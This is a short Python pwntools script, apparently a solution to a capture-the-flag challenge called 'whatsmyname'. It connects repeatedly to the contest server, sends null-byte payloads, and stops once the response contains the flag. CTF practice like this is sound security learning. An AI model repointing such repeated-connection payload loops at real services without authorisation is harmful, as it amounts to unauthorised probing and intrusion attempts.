from pwn import *
from os import system

clear = lambda: system('clear')
context.log_level='error'

payload = b'\x00'

for i in range (0,1000,1):
    clear()
    print(i)
    #p = process('./whatsmyname')
    p = remote('challs.actf.co',31223)

    p.recv()
    p.sendline(payload)
    p.recv()
    p.sendline(payload)
    flag = p.recv()

    if (b"actf" in flag):
        print (flag.decode('utf8'))
        break
